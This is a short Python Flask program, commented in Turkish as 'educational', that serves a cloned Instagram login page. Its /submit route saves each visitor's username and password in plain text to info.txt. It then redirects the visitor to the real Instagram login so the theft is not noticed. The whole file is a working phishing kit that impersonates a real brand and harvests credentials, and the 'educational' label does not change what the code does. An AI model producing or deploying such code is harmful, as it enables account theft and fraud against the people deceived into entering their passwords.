from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

# Instagram Giriş Sayfası (Eğitim Amaçlı)
HTML_INSTAGRAM_LOGIN = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Giriş Yap</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #262626;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            border-radius: 1px;
            width: 350px;
            text-align: center;
        }
        .logo {
            width: 175px;
            margin: 20px 0;
        }
        input {
            width: 100%;
            padding: 9px;
            margin: 6px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
        }
        button {
            width: 100%;
            padding: 7px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            margin: 10px 0;
            cursor: pointer;
        }
        button:hover {
            background-color: #0077c2;
        }
        .divider {
            margin: 15px 0;
            color: #8e8e8e;
            font-weight: bold;
            font-size: 13px;
            display: flex;
            align-items: center;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin: 15px 0;
        }
        .forgot-password {
            font-size: 12px;
            color: #00376b;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        <form method="POST" action="/submit">
            <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
        <div class="divider">YA DA</div>
        <div class="facebook-login">Facebook ile Giriş Yap</div>
        <div class="forgot-password">Şifreni mi unuttun?</div>
        <div class="footer">
            Hesabın yok mu? <a href="#" style="color: #0095f6; font-weight: bold;">Kaydol</a>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_INSTAGRAM_LOGIN)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    
    with open("info.txt", "a") as f:
        f.write(f"Kullanıcı Adı: {username}, Şifre: {password}\n")
    
    return redirect("https://www.instagram.com/accounts/login/")  # Gerçek Instagram sayfasına yönlendir

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
